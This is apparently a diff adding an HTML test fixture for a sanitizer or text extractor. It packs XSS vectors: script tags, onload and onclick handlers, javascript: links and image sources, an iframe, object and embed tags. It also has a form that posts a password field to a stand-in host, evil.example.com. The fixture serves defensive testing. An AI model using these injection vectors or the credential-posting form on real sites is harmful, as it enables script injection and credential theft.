@@ -1,0 +1,11 @@
+<html><head><script>alert("head")</script></head><body onload="evil()">
+<p onclick="evil()">Safe text</p>
+<script>document.write("bad")</script>
+<style>p { color: red }</style>
+<iframe src="https://evil.example.com/frame">frame text</iframe>
+<object data="x.swf">object text</object><embed src="y.swf">
+<form action="https://evil.example.com/steal"><input name="password" value="secret"><button>Send</button>Form text</form>
+<p><a href="javascript:steal()">Click me</a> and <img src="javascript:alert(1)" alt="bad image"></p>
+<svg><text>svg text</text></svg>
+<p>&lt;script&gt;still text&lt;/script&gt;</p>
+</body></html>
